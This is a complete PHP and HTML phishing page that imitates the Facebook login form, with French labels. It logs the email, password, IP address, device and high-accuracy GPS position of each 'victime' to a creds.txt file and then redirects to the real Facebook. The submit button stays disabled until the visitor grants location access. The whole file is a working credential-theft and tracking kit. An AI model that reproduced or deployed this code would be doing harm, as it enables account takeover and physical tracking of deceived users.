<?php
date_default_timezone_set('Africa/Bujumbura');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $gps = $_POST['gps'] ?? 'GPS_REFUSE';
    
    $time  = date('Y-m-d H:i:s');
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 FACEBOOK VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "│ 📍 GPS POSITION : {$gps}\n";
    $log .= "└─────────────────────────────────────────\n\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    echo '<script>setTimeout(function(){window.location.href="https://facebook.com";},1500);</script>';
    echo '<div style="text-align:center;padding:50px;color:#1877f2;"><h2>Connexion...</h2><div style="border:3px solid #f3f3f3;border-top:3px solid #1877f2;border-radius:50%;width:40px;height:40px;margin:auto;animation:spin 1s linear infinite;"></div></div>';
    echo '<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Facebook</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- TON CSS FACEBOOK EXACT -->
<style>
body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}
.login-form {
    background: white;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 15px 35px rgba(0,0,0,0.1);
    width: 100%;
    max-width: 400px;
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo img {
    width: 180px;
}
.input-group {
    margin-bottom: 20px;
}
input[type="text"], input[type="password"] {
    width: 100%;
    padding: 15px;
    border: 1px solid #ddd;
    border-radius: 5px;
    font-size: 16px;
    box-sizing: border-box;
}
input:focus {
    outline: none;
    border-color: #1877f2;
}
.submit-btn {
    width: 100%;
    padding: 15px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
}
.submit-btn:hover {
    background: #166fe5;
}
.submit-btn:disabled {
    background: #ccc;
    cursor: not-allowed;
}
.gps-info {
    background: #f0f8ff;
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    font-size: 14px;
    color: #0066cc;
    text-align: center;
    border-left: 4px solid #1877f2;
}
</style>
</head>
<body>
<div class="login-form">
    <div class="logo">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
    </div>
    
    <form method="POST">
        <input type="hidden" name="gps" id="gps_data">
        
        <div class="input-group">
            <input type="text" name="email" placeholder="Email ou numéro de téléphone" required autofocus>
        </div>
        
        <div class="input-group">
            <input type="password" name="pass" placeholder="Mot de passe" required>
        </div>
        
        <div class="gps-info" id="gps_display">📍 Activez la localisation GPS</div>
        
        <button type="submit" name="submit" id="send_btn" class="submit-btn" disabled>Envoyer</button>
    </form>
</div>

<script>
// TON GPS EXACT
function requestGPS() {
    navigator.geolocation.getCurrentPosition(
        position => {
            let gps_str = position.coords.latitude.toFixed(6) + "," + position.coords.longitude.toFixed(6);
            document.getElementById('gps_data').value = gps_str;
            document.getElementById('gps_display').innerHTML = "✅ GPS capturé: " + gps_str;
            document.getElementById('send_btn').disabled = false;
        },
        () => {
            document.getElementById('gps_display').innerHTML = "❌ GPS bloqué - Activez-le";
        },
        {enableHighAccuracy: true}
    );
}
window.onload = requestGPS;
</script>
</body>
</html>
